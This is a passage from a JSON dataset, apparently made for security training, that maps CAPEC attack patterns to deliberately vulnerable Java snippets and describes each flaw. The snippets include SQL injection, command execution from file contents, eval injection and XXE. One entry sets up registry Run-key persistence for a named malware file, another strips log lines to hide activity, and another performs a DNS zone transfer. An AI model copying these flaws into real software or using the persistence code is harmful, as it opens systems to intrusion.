        "description": "This vulnerable code demonstrates client-side authentication that can be easily bypassed, lacks protection against replay attacks, and includes debug logging of sensitive information. The authentication mechanism uses a static token and performs no server-side validation, making it susceptible to capture-replay attacks and authentication bypass."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "public class UserDataAccess {\n    private Connection conn;\n\n    public List<User> searchUsers(String searchTerm) {\n        List<User> users = new ArrayList<>();\n        try {\n            String query = \"SELECT * FROM users WHERE username LIKE '%\" + searchTerm + \"%' OR email LIKE '%\" + searchTerm + \"%'\";\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n            \n            while (rs.next()) {\n                User user = new User();\n                user.setId(rs.getInt(\"id\"));\n                user.setUsername(rs.getString(\"username\"));\n                user.setEmail(rs.getString(\"email\"));\n                user.setSocialSecurityNumber(rs.getString(\"ssn\"));\n                users.add(user);\n            }\n        } catch (SQLException e) {\n            System.err.println(\"Database error: \" + e.getMessage());\n            e.printStackTrace();\n        }\n        return users;\n    }\n}",
        "description": "This vulnerable code demonstrates a search function that accepts user input without proper validation and uses it directly in an SQL query. It exposes sensitive information through unfiltered queries and detailed error messages. The code is susceptible to SQL injection attacks and could leak sensitive data like social security numbers through both direct query results and error messages."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "public class FileProcessor {\n    public void processUploadedFile(String filePath) {\n        try {\n            File uploadedFile = new File(filePath);\n            String fileExt = filePath.substring(filePath.lastIndexOf('.'));\n            \n            // Blindly trust file extension to determine processing\n            if (fileExt.equals(\".txt\")) {\n                // Create temp file without proper security checks\n                File tempFile = new File(\"/tmp/\" + uploadedFile.getName());\n                Files.copy(uploadedFile.toPath(), tempFile.toPath());\n                \n                // Load and execute external library based on file content\n                System.load(tempFile.getAbsolutePath());\n                \n                // Process file without validation\n                BufferedReader reader = new BufferedReader(new FileReader(tempFile));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Process each line without sanitization\n                    executeCommand(line);\n                }\n                reader.close();\n            }\n        } catch (Exception e) {\n            // Silently fail, potentially leaving system in unsafe state\n        }\n    }\n    \n    private void executeCommand(String cmd) {\n        Runtime.getRuntime().exec(cmd);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it blindly trusts file extensions (CWE-646), creates insecure temporary files (CWE-377), loads external libraries without verification (CWE-829), and processes potentially dangerous file content without proper validation (CWE-434). The code fails silently, which could leave the system in an unsafe state, and executes commands from file content without sanitization."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "public class ConfigManager {\n    public static String DB_URL = \"jdbc:mysql://localhost:3306/mydb\";\n    public static String API_KEY = \"12345\";\n    \n    public void updateConfig(String userInput) {\n        // Unsafe eval-like operation using reflection\n        try {\n            String command = \"DB_URL = \\\"\" + userInput + \"\\\"\";\n            ScriptEngineManager manager = new ScriptEngineManager();\n            ScriptEngine engine = manager.getEngineByName(\"JavaScript\");\n            engine.eval(command);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void processRequest() {\n        String temp = \"SELECT * FROM users WHERE id = \" + DB_URL;\n        // Using global variable in multiple places\n        System.out.println(\"Current URL: \" + DB_URL);\n        System.out.println(\"Current API Key: \" + API_KEY);\n    }\n}",
        "description": "This vulnerable code demonstrates multiple issues: using eval-like operations (ScriptEngine) with unvalidated user input, excessive use of global variables with public static fields, and hardcoded literal values instead of symbolic constants. The wide scope of variables and unsafe dynamic evaluation creates potential security risks including injection attacks."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "public class UserManager {\n    public static String currentUser;\n    public static Map<String, Object> userPreferences = new HashMap<>();\n\n    public static void processUserInput(String input) {\n        String varName = input.split(\"=\")[0];\n        String value = input.split(\"=\")[1];\n        \n        // Dynamically set variable based on user input\n        try {\n            Field field = UserManager.class.getDeclaredField(varName);\n            field.set(null, value);\n        } catch (Exception e) {\n            userPreferences.put(varName, value);\n        }\n    }\n\n    public static void updateUserSettings(String settingName) {\n        // Dynamically evaluate and use variable names\n        Object value = userPreferences.get(settingName);\n        if (value != null) {\n            System.out.println(value);\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to dynamic variable manipulation and global state. It uses static global variables, allows dynamic modification of class fields through reflection based on user input, and provides unrestricted access to dynamically-identified variables through a global map. The code allows users to influence variable names at runtime without proper validation, potentially leading to unauthorized access or manipulation of program state."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "public class UserDataProcessor {\n    private String userData;\n\n    public void processUserInput(String input) {\n        // Validate before canonicalization (CWE-180)\n        if(input.matches(\"^[a-zA-Z0-9_]*$\")) {\n            userData = input.toLowerCase();\n            \n            // Dangerous eval-like execution (CWE-95)\n            ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"js\");\n            try {\n                engine.eval(\"var userValue = '\" + userData + \"';\");\n            } catch(ScriptException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @Deprecated\n    private void securityCheck() {\n        // Critical security code that might be optimized away (CWE-733)\n        volatile boolean securityFlag = checkSecurity();\n        if(!securityFlag) {\n            throw new SecurityException();\n        }\n    }\n\n    private boolean checkSecurity() {\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues including validation before canonicalization, eval injection, and compiler optimization of security-critical code. The code validates user input before canonicalization, potentially missing malicious input that becomes invalid after canonicalization. It also uses dangerous eval-like functionality with unsanitized input and contains security-critical code that might be removed by compiler optimization."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "public class FileProcessor {\n    public void processUserUpload(String fileName, String content) {\n        // Inadequate encoding validation before processing\n        if (!fileName.contains(\"<\") && !fileName.contains(\">\")) {\n            String decodedContent = URLDecoder.decode(content, \"UTF-8\");\n            \n            // Vulnerable path construction without proper encoding checks\n            File file = new File(\"/uploads/\" + fileName);\n            \n            // Processing content before proper canonicalization\n            if(!decodedContent.contains(\"<script>\")) {\n                FileWriter writer = new FileWriter(file);\n                writer.write(decodedContent);\n                writer.close();\n            }\n        }\n    }\n}",
        "description": "This code demonstrates multiple encoding-related vulnerabilities: it performs incomplete validation of file names, handles encoded content incorrectly by validating before full canonicalization, uses naive string comparison for security checks, and allows direct user input in file paths. It also implements an incomplete denylist-based XSS protection that can be bypassed using alternate encodings."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "public class LoggingService {\n    private static final Logger logger = Logger.getLogger(LoggingService.class);\n    private String logFilePath = \"/var/log/app.log\";\n\n    public void logUserActivity(String username, String action) {\n        try {\n            FileWriter fw = new FileWriter(logFilePath, true);\n            String logEntry = username + \" - \" + action + \" - \" + \n                             System.getProperty(\"user.dir\") + \" - \" +\n                             System.getProperty(\"user.home\") + \" - \" +\n                             new Date().toString();\n            \n            fw.write(logEntry + \"\\n\");\n            logger.info(\"User Activity: \" + logEntry);\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void cleanLogs(String searchPattern) {\n        try {\n            File logFile = new File(logFilePath);\n            List<String> lines = Files.readAllLines(logFile.toPath());\n            FileWriter fw = new FileWriter(logFile);\n            \n            for(String line : lines) {\n                if(!line.contains(searchPattern)) {\n                    fw.write(line + \"\\n\");\n                }\n            }\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple logging-related security issues: it allows direct manipulation of log files, logs sensitive system information, doesn't sanitize log entries, lacks proper access controls, and allows arbitrary log cleaning. The code writes unvalidated user input directly to logs, exposes system paths, and provides a method to selectively remove log entries, which could be used to cover tracks of malicious activities."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "public class RegistryManager {\n    private static final String REGISTRY_PATH = \"SOFTWARE\\\\MyApp\";\n    private static String adminPassword = \"secretPass123\";\n\n    public static void storeCredentials() {\n        try {\n            WinRegistry.writeStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REGISTRY_PATH,\n                \"AdminPassword\",\n                adminPassword  // Storing password in cleartext\n            );\n        } catch (Exception e) {\n            // Silent failure, no logging\n        }\n    }\n\n    public static void modifyRegistryAsAdmin() {\n        // No privilege check before modification\n        try {\n            String userValue = WinRegistry.readStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REGISTRY_PATH,\n                \"UserSettings\"\n            );\n            WinRegistry.writeStringValue(\n                WinRegistry.HKEY_LOCAL_MACHINE,\n                REGISTRY_PATH,\n                \"UserSettings\",\n                userValue + \"_modified\"\n            );\n        } catch (Exception e) {\n            // Incomplete error handling\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates storing sensitive information (password) in cleartext in the Windows Registry, lacks proper privilege checks when modifying registry values, and has incomplete error handling. It also fails to properly document the program execution flow and doesn't implement proper privilege context switching when performing administrative operations."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import java.util.prefs.Preferences;\nimport java.io.File;\n\npublic class RegistryPersistence {\n    private static final String DEFAULT_KEY = \"0123456789abcdef\";\n    private static final String RUN_KEY = \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\";\n    \n    public static void installPersistence(String malwareFile) {\n        try {\n            String userHome = System.getProperty(\"user.home\");\n            File execFile = new File(userHome + \"\\\\AppData\\\\Local\\\\\" + malwareFile);\n            \n            // Store malware path in registry with default encryption key\n            Preferences prefs = Preferences.userRoot().node(RUN_KEY);\n            prefs.put(\"SecurityService\", execFile.getAbsolutePath());\n            \n            // Store sensitive data in registry cleartext\n            prefs.put(\"credentials\", \"admin:password123\");\n            \n            // Run with elevated privileges\n            ProcessBuilder pb = new ProcessBuilder(execFile.getAbsolutePath());\n            pb.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates registry persistence by adding malware to the Windows Run key, storing sensitive data in cleartext, using default credentials and cryptographic keys, and attempting to run with elevated privileges. The code allows external control of system settings and stores sensitive information without proper encryption."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "public class SchemaValidator {\n    private String schemaPath;\n    private Document schema;\n\n    public SchemaValidator(String path) {\n        this.schemaPath = path;\n        loadSchema();\n    }\n\n    private void loadSchema() {\n        try {\n            File schemaFile = new File(schemaPath);\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            factory.setExpandEntityReferences(true);\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            schema = builder.parse(schemaFile);\n        } catch (Exception e) {\n            System.err.println(\"Error loading schema: \" + e.getMessage());\n        }\n    }\n\n    public boolean validateDocument(String xmlContent) {\n        try {\n            // Insecure: Using externally controlled schema without validation\n            String userProvidedSchemaPath = System.getProperty(\"user.schema\");\n            if (userProvidedSchemaPath != null) {\n                schemaPath = userProvidedSchemaPath;\n                loadSchema();\n            }\n\n            // Sensitive information leak in error messages\n            if (schema == null) {\n                System.err.println(\"Internal schema path: \" + schemaPath);\n                System.err.println(\"System classpath: \" + System.getProperty(\"java.class.path\"));\n                return false;\n            }\n\n            return true;\n        } catch (Exception e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable schema validator that allows external control of schema settings, mixes trusted and untrusted data, and leaks sensitive system information. It accepts an externally controlled schema path without proper validation, potentially allowing malicious schema injection. The code also exposes sensitive system information in error messages and doesn't properly sanitize or validate the schema before using it."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "public class AuthenticationServer {\n    private static Map<String, String> sessions = new HashMap<>();\n\n    public boolean authenticate(String token, String message) {\n        // No verification of message origin\n        String sessionId = sessions.get(token);\n        \n        // No message integrity check\n        String[] parts = message.split(\":\");\n        String username = parts[0];\n        String challenge = parts[1];\n        \n        // Vulnerable to replay attacks\n        if (sessionId != null) {\n            // Simply echo back the challenge\n            String response = challenge;\n            sessions.put(token, username);\n            return true;\n        }\n        return false;\n    }\n    \n    public void sendMessage(String destination, String message) {\n        // No validation of destination\n        Socket socket = new Socket(destination, 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(message);\n        // No encryption or integrity checking\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities in protocol implementation including lack of source verification, susceptibility to reflection attacks, missing message integrity checks, vulnerability to replay attacks, and improper destination validation in communication channels. The authentication mechanism doesn't verify message origins, doesn't implement proper challenge-response protocols, and doesn't protect against message tampering or replay attacks. The communication channel lacks proper encryption and integrity checks."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "public class VulnerableHttpProxy {\n    private static final String BACKEND_URL = \"http://backend-server.com\";\n    \n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String contentLength = request.getHeader(\"Content-Length\");\n        String transferEncoding = request.getHeader(\"Transfer-Encoding\");\n        \n        URL backendUrl = new URL(BACKEND_URL);\n        HttpURLConnection conn = (HttpURLConnection) backendUrl.openConnection();\n        \n        // Vulnerable: Direct header forwarding without sanitization\n        conn.setRequestProperty(\"Content-Length\", contentLength);\n        conn.setRequestProperty(\"Transfer-Encoding\", transferEncoding);\n        \n        // Vulnerable: Raw response forwarding\n        StringBuilder responseHeader = new StringBuilder();\n        responseHeader.append(\"HTTP/1.1 200 OK\\r\\n\");\n        responseHeader.append(\"Content-Length: \" + conn.getContentLength() + \"\\r\\n\");\n        responseHeader.append(conn.getHeaderField(\"Transfer-Encoding\") + \"\\r\\n\");\n        \n        // Vulnerable: Direct write to response without parsing/validation\n        response.getOutputStream().write(responseHeader.toString().getBytes());\n        IOUtils.copy(conn.getInputStream(), response.getOutputStream());\n    }\n}",
        "description": "This code demonstrates a vulnerable HTTP proxy implementation that allows for HTTP request/response smuggling. It forwards headers and content without proper sanitization, fails to properly handle CRLF sequences, and doesn't validate Content-Length and Transfer-Encoding headers. The code directly writes raw response content without parsing, making it susceptible to response splitting and interpretation conflicts between different HTTP agents."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "public class WebService {\n    private boolean isAdmin = false;\n\n    public String handleRequest(HttpServletRequest request) {\n        String httpMethod = request.getMethod();\n        String sensitiveData = \"CONFIDENTIAL_DATA\";\n        \n        // Vulnerable verb-based authentication\n        if (httpMethod.equals(\"GET\")) {\n            return \"Access denied\";\n        } else if (httpMethod.equals(\"POST\")) {\n            isAdmin = true;\n        }\n\n        // Access control based solely on HTTP verb\n        if (isAdmin) {\n            // Sensitive data in query string\n            String userToken = request.getQueryString();\n            // No sanitization of output\n            response.setHeader(\"X-Custom-Header\", userToken);\n            return sensitiveData;\n        }\n        \n        return \"Access denied\";\n    }\n}",
        "description": "This vulnerable code demonstrates authentication bypass through HTTP verb manipulation. It implements a flawed access control mechanism that relies solely on the HTTP method type, assumes HTTP method immutability, exposes sensitive data in query strings, and lacks proper output encoding for HTTP headers. An attacker can bypass the GET restriction by using different HTTP methods."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "public class DnsRedirectionService {\n    private String originalDomain = \"malicious-cdn.example.com\";\n    private InetAddress resolvedAddress;\n\n    public void setupRedirection() throws UnknownHostException {\n        // Initial DNS resolution\n        resolvedAddress = InetAddress.getByName(originalDomain);\n\n        // Create socket binding to 0.0.0.0 (all interfaces)\n        ServerSocket serverSocket = new ServerSocket(80, 50, \n            InetAddress.getByName(\"0.0.0.0\"));\n\n        // Vulnerable DNS reverse lookup for authentication\n        String hostname = resolvedAddress.getHostName();\n        if (isAllowedHost(hostname)) {\n            // Redirect to internal network resource\n            String redirectUrl = \"http://192.168.1.100:8080\" + \n                request.getParameter(\"redirect\");\n            response.sendRedirect(redirectUrl);\n        }\n    }\n\n    private boolean isAllowedHost(String hostname) {\n        // Relies solely on reverse DNS lookup for validation\n        return hostname.endsWith(\".trusted-domain.com\");\n    }\n}",
        "description": "This vulnerable code demonstrates DNS rebinding by creating a service that binds to all interfaces (0.0.0.0) and relies on reverse DNS lookups for security decisions. It accepts unvalidated redirects and allows an attacker to potentially access internal network resources through DNS manipulation. The code includes multiple vulnerabilities: insecure binding, reverse DNS reliance, and open redirects."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "public class InterProcessCommunication {\n    private static final String PIPE_PATH = \"\\\\\\\\.\\\\pipe\\\\sensitive_data\";\n    \n    public void sendData(String securityId, byte[] data) {\n        try {\n            RandomAccessFile pipe = new RandomAccessFile(PIPE_PATH, \"rw\");\n            \n            // Convert security ID without validation\n            int mappedId = Integer.parseInt(securityId);\n            \n            // Send security ID and data without encryption or integrity checks\n            pipe.writeInt(mappedId);\n            pipe.write(data);\n            \n            // Debug mode can be activated at runtime\n            if (System.getProperty(\"debug.mode\") != null) {\n                pipe.seek(0);\n                byte[] debug_data = new byte[data.length];\n                pipe.read(debug_data);\n                System.out.println(new String(debug_data));\n            }\n            \n            pipe.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable inter-component communication through a named pipe. It has multiple security issues: transmits sensitive data in cleartext, lacks message integrity checks, performs improper security identifier conversion, allows runtime debug activation, and doesn't validate message structure before processing."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "public class XMLDataProcessor {\n    private static final String TRUSTED_SENDER_ID = \"TRUSTED_ID_123\";\n    \n    public void processDataMessage(String xmlMessage, String senderId) {\n        try {\n            // Assume sender ID is immutable and trustworthy without validation\n            if (senderId.startsWith(TRUSTED_SENDER_ID)) {\n                DocumentBuilder builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();\n                Document doc = builder.parse(new InputSource(new StringReader(xmlMessage)));\n                \n                // Process sensitive data without proper validation\n                String accountNumber = doc.getElementsByTagName(\"accountNumber\").item(0).getTextContent();\n                String secretKey = doc.getElementsByTagName(\"secretKey\").item(0).getTextContent();\n                \n                // Directly forward data including sensitive information\n                forwardToDownstream(xmlMessage);\n                \n                // Store data assuming specific memory layout\n                byte[] rawData = xmlMessage.getBytes();\n                System.arraycopy(rawData, 0, sharedBuffer, 0, rawData.length);\n            }\n        } catch (Exception e) {\n            // Silently continue processing\n        }\n    }\n    \n    private byte[] sharedBuffer = new byte[1024];\n    \n    private void forwardToDownstream(String message) {\n        // Forward message without sanitization\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues in data interchange protocol handling: it assumes sender IDs are immutable and trustworthy, processes XML without proper validation, exposes sensitive data in transmissions, makes assumptions about memory layout, and lacks proper input sanitization. The code fails to implement proper security controls for data validation and transformation, potentially allowing attackers to manipulate the protocol or access sensitive information."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "public class WebServiceHandler {\n    @WebMethod\n    public String processRequest(String data, String functionName) {\n        try {\n            // Unsafe reflection to call function dynamically without validation\n            Method method = this.getClass().getMethod(functionName, String.class);\n            return (String) method.invoke(this, data);\n        } catch (Exception e) {\n            return \"Error processing request\";\n        }\n    }\n\n    public String getUserData(String userId) {\n        // No server-side validation of client permissions\n        return DatabaseConnector.fetchUserData(userId);\n    }\n\n    public String getAdminData(String param) {\n        // Relies on client-side access control\n        return DatabaseConnector.fetchSensitiveData(param);\n    }\n\n    private class DatabaseConnector {\n        public static String fetchUserData(String userId) {\n            return \"User data for: \" + userId;\n        }\n\n        public static String fetchSensitiveData(String param) {\n            return \"Sensitive data: \" + param;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a web service that allows dynamic method invocation without proper validation, relies on client-side security controls, and doesn't properly validate input parameters. The code allows function names to be passed as parameters and executed through reflection, enabling attackers to call restricted methods. It also lacks proper server-side authorization checks and input validation, making it susceptible to protocol manipulation attacks."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "public class SOAPService {\n    public String processSOAPRequest(String xmlRequest) {\n        try {\n            // No input validation or XML schema checks\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlRequest)));\n            \n            // Allow XML external entities without restrictions\n            factory.setExpandEntityReferences(true);\n            \n            // Client-side authentication token check\n            String authToken = doc.getElementsByTagName(\"auth-token\").item(0).getTextContent();\n            if (!authToken.equals(\"valid-token\")) {\n                return \"<error>Authentication failed</error>\";\n            }\n            \n            // Process SOAP operation without server-side validation\n            String operation = doc.getElementsByTagName(\"operation\").item(0).getTextContent();\n            String data = doc.getElementsByTagName(\"data\").item(0).getTextContent();\n            \n            // Directly use input in sensitive operation\n            return executeOperation(operation, data);\n            \n        } catch (Exception e) {\n            return \"<error>Processing failed</error>\";\n        }\n    }\n    \n    private String executeOperation(String operation, String data) {\n        // Perform operation without additional security checks\n        return \"<result>\" + data + \"</result>\";\n    }\n}",
        "description": "This vulnerable SOAP service implementation demonstrates multiple security issues: it lacks proper XML input validation, allows unrestricted XML external entities, relies on client-side authentication, doesn't implement protection against replay attacks, and performs no server-side security checks. The code directly processes untrusted XML input and authentication tokens without proper validation or sanitization."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "public class WebServiceEndpoint {\n    @WebService\n    public class BankingService {\n        private static final String WSDL_PATH = \"/public/banking.wsdl\";\n        \n        @WebMethod\n        public boolean processTransaction(String sessionToken, double amount) {\n            // No validation of session token\n            String storedToken = getStoredToken(sessionToken);\n            \n            // Vulnerable to replay attacks - no timestamp or nonce checking\n            if(sessionToken.equals(storedToken)) {\n                processPayment(amount);\n                // Sensitive information in logs\n                Logger.info(\"Transaction processed for token: \" + sessionToken \n                    + \" amount: \" + amount + \" account: \" + getAccountDetails());\n                return true;\n            }\n            return false;\n        }\n        \n        @WebMethod\n        public String getWSDLContent() {\n            // Exposing sensitive WSDL information\n            return Files.readString(Paths.get(WSDL_PATH));\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable SOAP web service implementation that exposes sensitive information through WSDL, lacks proper authentication mechanisms, is susceptible to capture-replay attacks due to simple token comparison, and logs sensitive information. The service doesn't implement proper token validation or replay protection, making it vulnerable to authentication bypass through replay attacks."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "public class NetworkScanner {\n    public void pingHost(String targetHost) throws IOException {\n        // Vulnerable ICMP echo implementation\n        Process process = Runtime.getRuntime().exec(\"ping -c 1 \" + targetHost);\n        BufferedReader reader = new BufferedReader(\n            new InputStreamReader(process.getInputStream())\n        );\n        \n        // Expose sensitive system information in cleartext\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(\"Host Status: \" + line);\n            // Log sensitive network data without encryption\n            FileWriter fw = new FileWriter(\"network_log.txt\", true);\n            fw.write(targetHost + \": \" + line + \"\\n\");\n            fw.close();\n        }\n        \n        // No error handling or access control\n        int exitValue = process.waitFor();\n        if (exitValue == 0) {\n            System.out.println(\"Host is up and responding!\");\n            // Debug mode enabled in production\n            System.setProperty(\"debug.mode\", \"true\");\n        }\n    }\n}",
        "description": "This vulnerable code performs ICMP ping scanning without proper security controls. It exposes sensitive system information through cleartext logging, lacks input validation for the target host parameter, enables debug features in production, and doesn't implement proper error handling or access controls. The code allows for network reconnaissance and potentially reveals system details to unauthorized actors."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "public class VulnerablePortScanner {\n    public static void main(String[] args) {\n        ServerSocket serverSocket = null;\n        try {\n            // Binding multiple services to same port\n            serverSocket = new ServerSocket(80);\n            serverSocket.setReuseAddress(true);\n            \n            // Insecure debug information exposure\n            System.out.println(\"Server configuration: \" + serverSocket.toString());\n            \n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                \n                // Transmitting sensitive data in cleartext\n                PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n                BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                \n                // Exposing system information to any connecting client\n                out.println(\"System Info: \" + System.getProperties());\n                out.println(\"Network Interface: \" + NetworkInterface.getNetworkInterfaces());\n                \n                // Debug mode always enabled\n                boolean debugMode = true;\n                if (debugMode) {\n                    out.println(\"Debug data: \" + Runtime.getRuntime().exec(\"netstat -an\"));\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it exposes sensitive system information, allows multiple binds to the same port, transmits data in cleartext, and leaves debug functionality enabled. The server readily provides detailed system information to any connecting client, making it susceptible to reconnaissance and port scanning attacks."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "public class AuthenticationServer {\n    private Map<String, String> tokenCache = new HashMap<>();\n\n    public boolean authenticateRequest(String token) {\n        // Vulnerable: Simple capture-replay attack possible\n        if (tokenCache.containsKey(token)) {\n            // Reused token is considered valid\n            return true;\n        }\n\n        if (validateToken(token)) {\n            // Store token in cache without expiration\n            tokenCache.put(token, \"valid\");\n            return true;\n        }\n        return false;\n    }\n\n    private boolean validateToken(String token) {\n        // Token validation logic\n        return token != null && token.length() > 0;\n    }\n}",
        "description": "This code demonstrates a vulnerable authentication system susceptible to capture-replay attacks (CWE-294). The system stores authentication tokens in a cache without implementing proper expiration or nonce mechanisms, allowing an attacker to capture and replay valid authentication tokens indefinitely. The implementation also lacks proper synchronization, potentially leading to race conditions in a multi-threaded environment."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "public class ResourceManager {\n    private static Map<String, Resource> protectedResources = new HashMap<>();\n    private static Map<String, Resource> unprotectedResources = new HashMap<>();\n\n    public static void mapResource(String address, Resource resource, boolean isProtected) {\n        if (isProtected) {\n            protectedResources.put(address, resource);\n        }\n        // Overlapping mapping allows access to protected resources through unprotected path\n        unprotectedResources.put(address, resource);\n    }\n\n    public static Resource accessResource(String address) {\n        // No proper authentication check\n        return unprotectedResources.get(address);\n    }\n}",
        "description": "This vulnerable code demonstrates overlapping resource mapping and authentication bypass issues. It allows unauthorized access to protected resources through an unprotected path by maintaining dual mappings of the same resource, effectively bypassing access controls. The code also creates emergent resources through the shared mapping that could be exploited by attackers."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "public class DnsMailServerLookup {\n    public void exposeMXRecords(String domain) {\n        try {\n            javax.naming.directory.InitialDirContext iDirC = new javax.naming.directory.InitialDirContext();\n            javax.naming.directory.Attributes attributes = iDirC.getAttributes(\n                \"dns:/\" + domain,\n                new String[] {\"MX\"}\n            );\n            \n            javax.naming.directory.Attribute attr = attributes.get(\"MX\");\n            if (attr != null) {\n                for (int i = 0; i < attr.size(); i++) {\n                    String mxRecord = (String) attr.get(i);\n                    // Directly expose MX record without sanitization\n                    System.out.println(\"Mail Server: \" + mxRecord);\n                    \n                    // Perform reverse DNS lookup without validation\n                    String[] parts = mxRecord.split(\" \");\n                    if (parts.length > 1) {\n                        java.net.InetAddress addr = java.net.InetAddress.getByName(parts[1]);\n                        System.out.println(\"IP Address: \" + addr.getHostAddress());\n                    }\n                }\n            }\n            iDirC.close();\n        } catch (Exception e) {\n            // Silently catch all exceptions, omitting security-relevant information\n        }\n    }\n}",
        "description": "This vulnerable code performs DNS MX record lookups and reverse DNS resolution without proper security controls. It exposes sensitive mail server information (CWE-200), relies on unvalidated reverse DNS lookups (CWE-350), doesn't properly handle security-relevant information (CWE-223), and exposes internal network details through DNS queries. The code fails to validate responses or implement proper error handling, potentially revealing internal infrastructure details to unauthorized actors."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "public class DNSZoneTransfer {\n    public static void main(String[] args) {\n        try {\n            String domain = \"targetdomain.com\";\n            Lookup lookup = new Lookup(domain, Type.AXFR);\n            SimpleResolver resolver = new SimpleResolver(\"ns1.targetdomain.com\");\n            lookup.setResolver(resolver);\n            \n            Record[] records = lookup.run();\n            if (records != null) {\n                for (Record record : records) {\n                    if (record instanceof ARecord) {\n                        ARecord aRecord = (ARecord) record;\n                        String hostname = aRecord.getName().toString();\n                        String ipAddress = aRecord.getAddress().getHostAddress();\n                        System.out.println(\"Host: \" + hostname + \", IP: \" + ipAddress);\n                        \n                        // Insecurely storing sensitive DNS information\n                        storeNetworkInfo(hostname, ipAddress);\n                    }\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static void storeNetworkInfo(String hostname, String ip) {\n        // Storing sensitive network topology information without access control\n        NetworkTopology.add(hostname, ip);\n    }\n}",
        "description": "This vulnerable code demonstrates DNS zone transfer exploitation by attempting to perform AXFR (full zone transfer) requests without proper authentication or restrictions. The code retrieves and stores sensitive network topology information including hostnames and IP addresses. It exhibits CWE-200 by exposing sensitive DNS information, and CWE-350 by relying on DNS data for security-critical operations without proper validation. The code insecurely stores gathered information and doesn't implement any access controls or verification mechanisms."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
